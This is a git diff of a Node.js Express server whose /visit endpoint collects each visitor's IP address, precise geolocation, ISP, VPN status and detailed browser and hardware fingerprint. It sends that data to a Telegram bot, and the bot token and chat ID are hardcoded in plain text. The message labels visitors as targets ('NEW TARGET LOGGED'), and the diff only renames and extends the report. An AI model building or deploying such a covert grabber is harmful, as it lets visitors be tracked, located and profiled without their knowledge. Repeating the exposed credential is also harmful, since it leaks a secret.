@@ -4,7 +4,7 @@ const path = require("path");
 const app = express();
 app.use(express.json());
 
-// ====== CONFIGURATION ======
+// ====== SECURE CONFIG ======
 const TELEGRAM_BOT_TOKEN = "8099317271:AAGndvsVqk9qNnzitfLhqp8UenEzlxxBA8Y";
 const TELEGRAM_CHAT_ID = "8059402181";
 const PORT = process.env.PORT || 3000;
@@ -21,60 +21,63 @@ async function sendToTelegram(text) {
         parse_mode: "HTML"
       }),
     });
-  } catch (err) { console.error("Telegram Error:", err); }
+  } catch (err) { console.error("Dispatch Error:", err); }
 }
 
-// ====== VISIT LOGGER ======
+// ====== LOGGING LOGIC ======
 app.post("/visit", async (req, res) => {
   try {
     const client = req.body;
     const ip = req.headers["x-forwarded-for"]?.split(",")[0] || req.socket.remoteAddress;
 
-    // Fetch ISP and Detailed Location
-    const geoRes = await fetch(`http://ip-api.com/json/${ip}?fields=66846719`);
+    // Fetch Full ISP & Geo Data (Maximum fields)
+    const geoRes = await fetch(`http://ip-api.com/json/${ip}?fields=16777215`);
     const geo = await geoRes.json();
 
-    const message = `
-<b>🚀 NEW TARGET LOGGED (100% INTEL)</b>
+    const report = `
+<b>🚀 ULTIMATE VISITOR INTEL REPORT (100%)</b>
 ------------------------------------
-<b>🌐 NETWORK INFO</b>
-<b>IP:</b> ${ip}
-<b>ISP:</b> ${geo.isp}
-<b>Organization:</b> ${geo.org}
-<b>VPN/Proxy:</b> ${geo.proxy ? "YES ⚠️" : "No"}
-<b>Hosting:</b> ${geo.hosting ? "YES (Data Center)" : "No"}
+<b>🌐 ISP & NETWORK (DEEP SCAN)</b>
+<b>• ISP:</b> ${geo.isp}
+<b>• Org Name:</b> ${geo.org || 'N/A'}
+<b>• ASN:</b> ${geo.as}
+<b>• IP Type:</b> ${geo.hosting ? "Cloud/Hosting" : "Residential/Mobile"}
+<b>• VPN/Proxy:</b> ${geo.proxy ? "Detected ⚠️" : "Clean ✅"}
 
-<b>📍 GEOGRAPHIC DATA</b>
-<b>Location:</b> ${geo.city}, ${geo.regionName}, ${geo.country}
-<b>Coordinates:</b> ${geo.lat}, ${geo.lon}
-<b>Timezone:</b> ${client.timezone}
+<b>📍 PRECISE GEOGRAPHY</b>
+<b>• Country:</b> ${geo.country} (${geo.countryCode})
+<b>• Region:</b> ${geo.regionName}
+<b>• City:</b> ${geo.city} (${geo.zip})
+<b>• Lat/Lon:</b> ${geo.lat}, ${geo.lon}
+<b>• ISP Timezone:</b> ${geo.timezone}
 
 <b>💻 HARDWARE SPECIFICATIONS</b>
-<b>OS/Platform:</b> ${client.platform}
-<b>GPU:</b> ${client.gpu}
-<b>CPU Cores:</b> ${client.cores}
-<b>RAM:</b> ~${client.memory} GB
-<b>Screen:</b> ${client.screen} (${client.pixelRatio}x density)
-<b>Touch Points:</b> ${client.maxTouchPoints}
+<b>• CPU Cores:</b> ${client.hardware?.cores}
+<b>• Memory (RAM):</b> ~${client.hardware?.ram} GB
+<b>• GPU (Renderer):</b> <code>${client.gpu?.renderer || 'N/A'}</code>
+<b>• Platform:</b> ${client.hardware?.platform}
+<b>• Resolution:</b> ${client.display?.width}x${client.display?.height}
+<b>• Touch Support:</b> ${client.hardware?.touchPoints > 0 ? "Yes" : "No"}
 
-<b>🔋 DEVICE STATUS</b>
-<b>Battery:</b> ${client.battery?.level || "N/A"} (${client.battery?.charging || "N/A"})
-<b>Connection:</b> ${client.connection?.type || "N/A"} (Speed: ~${client.connection?.downlink} Mbps)
+<b>🔋 LIVE DEVICE STATUS</b>
+<b>• Battery:</b> ${client.status?.battery || 'N/A'} (${client.status?.charging || 'N/A'})
+<b>• Connection:</b> ${client.networkType?.type} (~${client.networkType?.downlink})
+<b>• Latency (RTT):</b> ${client.networkType?.rtt}
 
-<b>🧠 BROWSER IDENTIFIER</b>
-<b>Language:</b> ${client.languages}
-<b>Referrer:</b> ${client.referrer}
-<b>User-Agent:</b> <code>${req.headers["user-agent"]}</code>
+<b>🧠 BROWSER FINGERPRINT</b>
+<b>• Languages:</b> ${client.browser?.languages}
+<b>• Referrer:</b> ${client.browser?.referrer}
+<b>• Automation Bot:</b> ${client.browser?.webdriver ? "YES 🤖" : "No"}
+<b>• User-Agent:</b> <code>${req.headers["user-agent"]}</code>
 
-<b>⏰ TIMESTAMP:</b> ${new Date().toUTCString()}
+<b>⏰ LOG TIME:</b> ${new Date().toUTCString()}
 ------------------------------------
 `;
 
-    await sendToTelegram(message);
-    res.json({ status: "success" });
+    await sendToTelegram(report);
+    res.json({ success: true });
   } catch (e) {
-    console.error(e);
-    res.status(500).json({ error: "internal_error" });
+    res.status(500).json({ error: "log_failed" });
   }
 });
 
@@ -83,5 +86,5 @@ app.get("/", (req, res) => {
 });
 
 app.listen(PORT, () => {
-  console.log(`[LOG] Server active on port ${PORT}`);
+  console.log(`Server Online - Port ${PORT}`);
 });
